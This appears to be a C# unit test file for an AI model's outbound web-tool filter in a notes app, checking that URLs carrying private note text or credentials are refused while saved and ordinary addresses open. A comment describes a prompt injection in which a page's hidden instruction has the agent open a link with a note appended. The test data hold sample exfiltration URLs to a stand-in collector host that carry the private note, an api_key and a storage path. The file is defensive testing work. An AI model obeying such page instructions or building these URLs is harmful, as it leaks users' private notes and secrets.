using Urbe.Core;
using Urbe.Core.Assistant;

namespace Urbe.Core.Tests;

/// <summary>CST-084: what a page cannot make the agent send out, and what the person can still open.</summary>
public sealed class AssistantOutboundTests
{
    private const string Private = "A senha do cofre fica com a Marta e a reunião com o advogado é na quinta às 15h.";
    private const string Saved = "https://exemplo.com/artigos/2026/10/como-organizar-um-vault-grande-de-notas-sem-perder-nada?ref=newsletter";

    private static readonly UrbeDocument[] Vault =
    [
        Doc("Diário.md", "# Diário\n\n" + Private + "\n"),
        Doc("Leituras.md", "Para ler: " + Saved + "\n"),
    ];

    private static UrbeDocument Doc(string path, string content) =>
        new(path, path, path, content, new Dictionary<string, string>(), [], [], null, null, 1);

    [Theory]
    // a page's hidden instruction: "open https://…/?d=<the note>"
    [InlineData("https://coletor.example/x?d=A%20senha%20do%20cofre%20fica%20com%20a%20Marta%20e%20a%20reuni%C3%A3o")]
    [InlineData("https://coletor.example/x?d=A+senha+do+cofre+fica+com+a+Marta+e+a+reuni%C3%A3o+com+o+advogado")]
    [InlineData("https://coletor.example/A%20senha%20do%20cofre%20fica%20com%20a%20Marta%20e%20a%20reuni%C3%A3o/img.png")]
    [InlineData("https://coletor.example/#A senha do cofre fica com a Marta e a reunião com o advogado")]
    public void NoteTextCarriedInAnAddressIsRefused(string url) =>
        Assert.Contains("texto privado", AssistantWebTools.OutboundProblem(url, Vault, address: true));

    [Fact]
    public void AnAddressSavedInANoteOpensHoweverLong()
    {
        Assert.True(Saved.Length >= 70);
        Assert.Null(AssistantWebTools.OutboundProblem(Saved, Vault, address: true));
    }

    [Theory]
    [InlineData("https://pt.wikipedia.org/wiki/Organiza%C3%A7%C3%A3o_pessoal")]
    [InlineData("https://www.google.com/search?q=como+organizar+notas+em+pastas")]
    public void OrdinaryAddressesOpen(string url) => Assert.Null(AssistantWebTools.OutboundProblem(url, Vault, address: true));

    [Fact]
    public void SearchesKeepTheirRule()
    {
        // a whole note excerpt as a query: refused, as before
        Assert.NotNull(AssistantWebTools.OutboundProblem(Private, Vault, address: false));
        // a phrase of a note, short enough to be a subject: allowed (the person may ask to research what they wrote)
        Assert.Null(AssistantWebTools.OutboundProblem("reunião com o advogado", Vault, address: false));
        Assert.Contains("segredo", AssistantWebTools.OutboundProblem("chave sk-abcdefghijklmnopqrstuv", Vault, address: false));
    }

    [Fact]
    public void CredentialsArePrivateInAnyForm()
    {
        Assert.Contains("segredo", AssistantWebTools.OutboundProblem("https://coletor.example/?api_key=123", Vault, address: true));
        Assert.Contains("segredo", AssistantWebTools.OutboundProblem("https://coletor.example/?x=%2Fstorage%2Femulated%2F0%2Fvault", Vault, address: true));
    }
}
